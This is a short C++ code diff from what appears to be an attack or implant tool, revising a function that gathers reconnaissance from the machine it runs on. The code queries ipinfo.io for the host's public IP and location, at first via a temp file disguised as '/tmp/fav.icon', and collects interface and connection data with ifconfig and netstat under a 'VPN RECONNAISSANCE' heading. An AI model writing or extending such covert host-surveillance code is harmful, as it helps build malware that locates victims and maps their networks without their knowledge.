@@ -401,20 +401,20 @@ std::string perform_full_recon() {
     return output.str();
 }
 
-std::string collect_location_info() {
+std::string collect_ip_info() {
     std::ostringstream output;
 
-    std::string o1 = exec_helper("wget -O /tmp/fav.icon ipinfo.io");
-    std::string o2 = exec_helper("cat /tmp/fav.icon");
-    std::string o3 = exec_helper("rm /tmp/fav.icon");
+    std::string o1 = exec_helper("curl ipinfo.io");
 
-    output << "=== LOCATION RECONNAISSANCE ===\n";
-    output << "IP based location info: " << o2 << "\n";
+    output << "=== IP RECONNAISSANCE ===\n";
+    output << "IP based location info: " << o1 << "\n";
 
-    std::string o4 = exec_helper("ip addr show");
+    std::string o4 = exec_helper("ifconfig");
+    std::string o5 = exec_helper("netstat");
 
     output << "\n--- VPN RECONNAISSANCE ---\n";
     output << o4 << "\n";
+    output << o5 << "\n";
 
     output << "\n=== END RECON ===\n";
     return output.str();
